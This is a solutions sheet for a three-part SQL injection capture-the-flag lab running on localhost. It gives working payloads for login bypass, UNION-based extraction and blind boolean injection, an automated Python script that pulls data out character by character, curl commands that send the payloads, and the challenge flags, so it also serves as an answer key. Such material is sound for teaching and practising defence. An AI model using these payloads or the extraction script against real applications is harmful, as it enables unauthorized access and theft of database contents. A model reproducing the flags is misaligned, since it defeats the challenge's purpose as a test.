# SQL INJECTION EXPLOITS - SOLUTIONS

## Challenge 1: Login Bypass

**Vulnerability:** Direct string concatenation in SQL query
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Exploit Payloads:**
```
Username: admin'--
Password: anything

OR

Username: ' OR '1'='1'--
Password: anything

OR

Username: admin' OR '1'='1
Password: ' OR '1'='1
```

**How it works:**
```sql
-- Original query:
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'

-- After injection, becomes:
SELECT * FROM users WHERE username = 'admin'
-- The rest is commented out with --
```

**Flag:** `FLAG{sql_login_bypass_success}`

---

## Challenge 2: UNION-based SQL Injection

**Vulnerability:** Unsanitized search parameter
```python
query = f"SELECT id, name, price, category FROM products WHERE name LIKE '%{search}%'"
```

**Exploit Steps:**

1. **Find column count (4 columns):**
```
?search=' UNION SELECT NULL,NULL,NULL,NULL--
```

2. **Extract the flag:**
```
?search=' UNION SELECT id,flag_name,999,flag_value FROM secret_flags WHERE id=2--
```

**How it works:**
```sql
-- Original query:
SELECT id, name, price, category FROM products WHERE name LIKE '%' 
UNION SELECT id,flag_name,999,flag_value FROM secret_flags WHERE id=2--
%'

-- The -- comments out the trailing %
-- UNION combines results from both queries
```

**Flag:** `FLAG{union_injection_master}`

---

## Challenge 3: Blind Boolean SQL Injection

**Vulnerability:** Numeric parameter without quotes
```python
query = f"SELECT * FROM users WHERE id = {user_id}"
```

**Exploit - Manual Method:**

Test character by character:
```
?id=1 AND (SELECT SUBSTR(flag_value,1,1) FROM secret_flags WHERE id=3)='F'
→ User found ✓ (TRUE - first char is 'F')

?id=1 AND (SELECT SUBSTR(flag_value,2,1) FROM secret_flags WHERE id=3)='L'
→ User found ✓ (TRUE - second char is 'L')

?id=1 AND (SELECT SUBSTR(flag_value,3,1) FROM secret_flags WHERE id=3)='A'
→ User found ✓ (TRUE - third char is 'A')

Continue until you extract: FLAG{blind_sqli_champion}
```

**Exploit - Automated Script:**
```python
import requests

url = "http://localhost:5000/challenge3"
flag = ""
position = 1

charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}"

while True:
    found = False
    for char in charset:
        payload = f"1 AND (SELECT SUBSTR(flag_value,{position},1) FROM secret_flags WHERE id=3)='{char}'"
        r = requests.get(url, params={"id": payload})
        
        if "User found" in r.text:
            flag += char
            print(f"Position {position}: {char} → {flag}")
            position += 1
            found = True
            break
    
    if not found or flag.endswith("}"):
        break

print(f"\nFinal Flag: {flag}")
```

**Flag:** `FLAG{blind_sqli_champion}`

---

## Quick Reference Table

| Challenge | Type | Difficulty | Exploit | Flag |
|-----------|------|------------|---------|------|
| 1 | Login Bypass | Easy | `admin'--` | FLAG{sql_login_bypass_success} |
| 2 | UNION SQLi | Medium | `' UNION SELECT id,flag_name,999,flag_value FROM secret_flags WHERE id=2--` | FLAG{union_injection_master} |
| 3 | Blind SQLi | Hard | Boolean testing with SUBSTR() | FLAG{blind_sqli_champion} |

---

## Testing Commands

**Challenge 1 (Login):**
```bash
curl -X POST http://localhost:5000/challenge1 \
  -d "username=admin'--&password=anything"
```

**Challenge 2 (Search):**
```bash
curl "http://localhost:5000/challenge2?search=' UNION SELECT id,flag_name,999,flag_value FROM secret_flags WHERE id=2--"
```

**Challenge 3 (Profile):**
```bash
curl "http://localhost:5000/challenge3?id=1 AND (SELECT SUBSTR(flag_value,1,1) FROM secret_flags WHERE id=3)='F'"
```
